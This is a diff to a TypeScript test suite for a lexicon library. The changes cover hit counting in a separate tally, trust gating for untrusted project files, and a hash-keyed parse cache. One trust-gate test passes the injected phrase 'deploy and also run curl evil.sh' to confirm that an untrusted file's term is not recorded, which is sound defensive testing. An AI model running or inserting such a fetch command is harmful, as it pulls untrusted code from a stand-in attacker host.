@@ -39,6 +39,10 @@ import {
   loadLexicon,
   mergeLexicons,
   readLexiconFile,
+  PARSE_CACHE_FILE_NAME,
+  PARSE_CACHE_MIN_BYTES,
+  readGlobalHits,
+  readHitsFor,
   readProjectHits,
   recordHits,
   removeTerm,
@@ -144,7 +148,6 @@ describe('readLexiconFile / writeLexiconFile', () => {
       settings: { minConfidence: 0.9, protectedWords: ['sauce'] },
       terms: [
         {
-          hits: 3,
           notes: 'my company',
           aliases: ['Ashler', 'Ashlar'],
           canonical: 'Ashlr.AI',
@@ -169,7 +172,7 @@ describe('readLexiconFile / writeLexiconFile', () => {
     expect(body.indexOf('version:')).toBeLessThan(body.indexOf('settings:'));
     expect(body.indexOf('settings:')).toBeLessThan(body.indexOf('terms:'));
     const termBlock = body.slice(body.indexOf('terms:'));
-    const order = ['canonical:', 'aliases:', 'phonetic:', 'category:', 'notes:', 'hits:'].map((k) =>
+    const order = ['canonical:', 'aliases:', 'phonetic:', 'category:', 'notes:', 'source:', 'createdAt:'].map((k) =>
       termBlock.indexOf(k),
     );
     expect([...order].sort((a, b) => a - b)).toEqual(order);
@@ -390,7 +393,9 @@ describe('loadLexicon trust gate', () => {
     const before = await fs.readFile(projectPath, 'utf8');
     await recordHits(['deploy and also run curl evil.sh', 'Mason'], { cwd: nested, globalPath });
     expect(await fs.readFile(projectPath, 'utf8')).toBe(before);
-    expect(findTerm((await readLexiconFile(globalPath, 'global')).lexicon, 'Mason')?.hits).toBe(1);
+    expect(findTerm((await loadLexicon({ cwd: nested, globalPath })).merged, 'Mason')?.hits).toBe(1);
+    // Only the global term is counted: the untrusted file's canonical is not recorded anywhere.
+    expect(await readGlobalHits({ globalPath })).toEqual({ mason: 1 });
     expect((await loadLexicon({ cwd: nested, globalPath })).projectTrust).toBe('untrusted');
 
     await trustProject(projectPath, { globalPath });
@@ -675,20 +680,56 @@ describe('recordHits', () => {
     expect(findTerm((await loadLexicon({ cwd: nested, globalPath })).merged, 'Ashlr.AI')?.hits).toBe(12);
   });
 
-  it('counts a global term in the global file, and lets the project file claim it first', async () => {
+  it('counts a global term in the sidecar, never the global file, and lets the project file claim it first', async () => {
     const { nested, projectPath, before } = await counted();
     // 'Shared' is in both files; the project file wins the merge, so only the
-    // project tally may move. 'G' is global-only and moves in the global file.
+    // project tally may move. 'G' is global-only and moves in the global tally.
     await addTerm({ canonical: 'Shared', aliases: [] }, { cwd: nested, globalPath });
     await addTerm({ canonical: 'Shared', aliases: [] }, { cwd: nested, globalPath, scope: 'project' });
     const after = await fs.readFile(projectPath);
-    await recordHits(['g', 'shared'], { cwd: nested, globalPath });
+    const globalBefore = await fs.readFile(globalPath);
+    await recordHits(['g', 'shared', 'not-a-term'], { cwd: nested, globalPath });
 
-    expect(findTerm((await readLexiconFile(globalPath, 'global')).lexicon, 'G')?.hits).toBe(1);
-    expect(findTerm((await readLexiconFile(globalPath, 'global')).lexicon, 'Shared')?.hits).toBeUndefined();
+    // The user's own lexicon is not rewritten for a counter.
+    expect(Buffer.compare(await fs.readFile(globalPath), globalBefore)).toBe(0);
+    expect(await readGlobalHits({ globalPath })).toEqual({ g: 1 });
     expect(await readProjectHits(projectPath, { globalPath })).toEqual({ shared: 1 });
     expect(Buffer.compare(await fs.readFile(projectPath), after)).toBe(0);
+    const loaded = await loadLexicon({ cwd: nested, globalPath });
+    expect(findTerm(loaded.merged, 'G')?.hits).toBe(1);
+    expect(findTerm(loaded.merged, 'Shared')?.hits).toBe(1);
     void before;
+  });
+
+  it('with `loaded` reads no lexicon file, and still honours ownership and trust', async () => {
+    const { nested, projectPath } = await counted();
+    const loaded = await loadLexicon({ cwd: nested, globalPath });
+    // Make both files unreadable: a re-read would throw (and be swallowed, counting nothing).
+    const globalText = await fs.readFile(globalPath, 'utf8');
+    const projectText = await fs.readFile(projectPath, 'utf8');
+    await fs.writeFile(globalPath, 'terms: [\n  - :::\n');
+    await fs.writeFile(projectPath, 'terms: [\n  - :::\n');
+    await recordHits(['G', 'P', 'P', 'stray'], { cwd: nested, globalPath, loaded });
+    expect(await readGlobalHits({ globalPath })).toEqual({ g: 1 });
+    expect(await readProjectHits(projectPath, { globalPath })).toEqual({ p: 2 });
+    await fs.writeFile(globalPath, globalText);
+    await fs.writeFile(projectPath, projectText);
+
+    // An untrusted project in `loaded` counts nothing for its terms.
+    await recordHits(['P'], { cwd: nested, globalPath, loaded: { ...loaded, projectTrust: 'untrusted' } });
+    expect(await readProjectHits(projectPath, { globalPath })).toEqual({ p: 2 });
+    expect(await readGlobalHits({ globalPath })).toEqual({ g: 1 });
+  });
+
+  it('keeps a count already in the global file as a floor and forgets a removed global term', async () => {
+    await fs.mkdir(path.dirname(globalPath), { recursive: true });
+    await fs.writeFile(globalPath, 'version: 1\nterms:\n  - canonical: Legacy\n    aliases: []\n    hits: 10\n');
+    await recordHits(['Legacy', 'Legacy'], { cwd: tmp, globalPath });
+    expect(findTerm((await readLexiconFile(globalPath, 'global')).lexicon, 'Legacy')?.hits).toBe(10);
+    expect(findTerm((await loadLexicon({ cwd: tmp, globalPath })).merged, 'Legacy')?.hits).toBe(12);
+    expect(await readHitsFor({ path: globalPath, scope: 'global' }, { globalPath })).toEqual({ legacy: 2 });
+    expect(await removeTerm('Legacy', { cwd: tmp, globalPath })).toBe(true);
+    expect(await readGlobalHits({ globalPath })).toEqual({});
   });
 
   it('swallows errors (unreadable global file)', async () => {
@@ -761,14 +802,74 @@ describe('writeLexiconFile pins a project file\'s hits', () => {
     expect(findTerm((await loadLexicon({ cwd: nested, globalPath })).merged, 'P')?.hits).toBe(7);
   });
 
-  it('leaves a global file\'s hits exactly as written', async () => {
-    await writeLexiconFile({
-      path: globalPath,
-      scope: 'global',
-      lexicon: { version: 1, terms: [{ canonical: 'G', aliases: [], hits: 42 }] },
-      exists: false,
-    });
+  it('pins a global file\'s hits too, so a merged term written back cannot double-count', async () => {
+    await fs.mkdir(path.dirname(globalPath), { recursive: true });
+    await fs.writeFile(globalPath, 'version: 1\nterms:\n  - canonical: G\n    aliases: []\n    hits: 42\n');
+    await recordHits(['G'], { cwd: tmp, globalPath });
+    const loaded = await loadLexicon({ cwd: tmp, globalPath });
+    expect(findTerm(loaded.merged, 'G')?.hits).toBe(43);
+    await writeLexiconFile({ path: globalPath, scope: 'global', lexicon: loaded.merged, exists: true });
     expect(findTerm((await readLexiconFile(globalPath, 'global')).lexicon, 'G')?.hits).toBe(42);
+    expect(findTerm((await loadLexicon({ cwd: tmp, globalPath })).merged, 'G')?.hits).toBe(43);
+  });
+});
+
+describe('global parse cache', () => {
+  const cachePath = (): string => path.join(path.dirname(globalPath), PARSE_CACHE_FILE_NAME);
+  /** A YAML comment that takes a lexicon past the size the cache starts at. */
+  const PAD = `${'# padding\n'.repeat(Math.ceil(PARSE_CACHE_MIN_BYTES / 10))}`;
+
+  it('leaves a small lexicon uncached', async () => {
+    await fs.mkdir(path.dirname(globalPath), { recursive: true });
+    await fs.writeFile(globalPath, 'version: 1\nterms:\n  - canonical: Small\n    aliases: []\n');
+    expect(findTerm((await loadLexicon({ cwd: tmp, globalPath })).merged, 'Small')).toBeDefined();
+    await expect(fs.stat(cachePath())).rejects.toThrow();
+  });
+
+  it('is written by loadLexicon, reused for the same bytes, and ignored once the file changes', async () => {
+    await fs.mkdir(path.dirname(globalPath), { recursive: true });
+    await fs.writeFile(globalPath, `${PAD}version: 1\nterms:\n  - canonical: Ashlr.AI\n    aliases: [Ashler]\n`);
+    await fs.chmod(globalPath, 0o600);
+    expect(findTerm((await loadLexicon({ cwd: tmp, globalPath })).merged, 'Ashlr.AI')).toBeDefined();
+    const cached = JSON.parse(await fs.readFile(cachePath(), 'utf8')) as { sha256: string; lexicon: Lexicon };
+    expect(cached.lexicon.terms[0].canonical).toBe('Ashlr.AI');
+    // Same permission bits as the lexicon: it holds the same names.
+    if (process.platform !== 'win32') expect((await fs.stat(cachePath())).mode & 0o777).toBe(0o600);
+
+    // Proof the entry is what gets read: doctor it while keeping the key.
+    cached.lexicon.terms[0].aliases = ['from-cache'];
+    await fs.writeFile(cachePath(), JSON.stringify(cached));
+    expect(findTerm((await loadLexicon({ cwd: tmp, globalPath })).merged, 'Ashlr.AI')?.aliases).toEqual(['from-cache']);
+
+    // A hand edit changes the hash, so the YAML is parsed again and the entry refreshed.
+    await fs.writeFile(globalPath, `${PAD}version: 1\nterms:\n  - canonical: Ashlr.AI\n    aliases: [Ashlar]\n`);
+    expect(findTerm((await loadLexicon({ cwd: tmp, globalPath })).merged, 'Ashlr.AI')?.aliases).toEqual(['Ashlar']);
+    expect((JSON.parse(await fs.readFile(cachePath(), 'utf8')) as { lexicon: Lexicon }).lexicon.terms[0].aliases).toEqual(['Ashlar']);
+  });
+
+  it('falls back to the YAML on a corrupt or invalid cache, and never caches a file that does not parse', async () => {
+    await fs.mkdir(path.dirname(globalPath), { recursive: true });
+    await fs.writeFile(globalPath, `${PAD}version: 1\nterms:\n  - canonical: G\n    aliases: [gee]\n`);
+    await loadLexicon({ cwd: tmp, globalPath });
+    await expect(fs.stat(cachePath())).resolves.toBeDefined();
+    await fs.writeFile(cachePath(), '{ not json');
+    expect(findTerm((await loadLexicon({ cwd: tmp, globalPath })).merged, 'G')?.aliases).toEqual(['gee']);
+    const entry = JSON.parse(await fs.readFile(cachePath(), 'utf8')) as { lexicon: { terms: unknown[] } };
+    entry.lexicon.terms = [{ canonical: 5 }];
+    await fs.writeFile(cachePath(), JSON.stringify(entry));
+    // The cached value goes through the real validator, which rejects it, so the YAML wins.
+    const realSchema = await vi.importActual<typeof import('../src/core/schema.js')>('../src/core/schema.js');
+    schemaOverride.parseLexicon = realSchema.parseLexicon;
+    try {
+      expect(findTerm((await loadLexicon({ cwd: tmp, globalPath })).merged, 'G')?.aliases).toEqual(['gee']);
+    } finally {
+      schemaOverride.parseLexicon = undefined;
+    }
+
+    await fs.rm(cachePath());
+    await fs.writeFile(globalPath, `${PAD}terms: [\n  - :::\n`);
+    await expect(loadLexicon({ cwd: tmp, globalPath })).rejects.toThrow(/Failed to parse lexicon YAML/);
+    await expect(fs.stat(cachePath())).rejects.toThrow();
   });
 });
 
@@ -873,7 +974,7 @@ describe('concurrent writers', () => {
 
     const back = await readLexiconFile(globalPath, 'global');
     expect(back.lexicon.terms.map((t) => t.canonical).sort()).toEqual(['A', 'B', 'C', 'D', 'E', 'Seed']);
-    expect(findTerm(back.lexicon, 'Seed')?.hits).toBe(20);
+    expect(findTerm((await loadLexicon({ cwd: tmp, globalPath })).merged, 'Seed')?.hits).toBe(20);
   });
 
   it('breaks a lock whose owner is gone, so a crash or a Ctrl-C does not wedge the file', async () => {
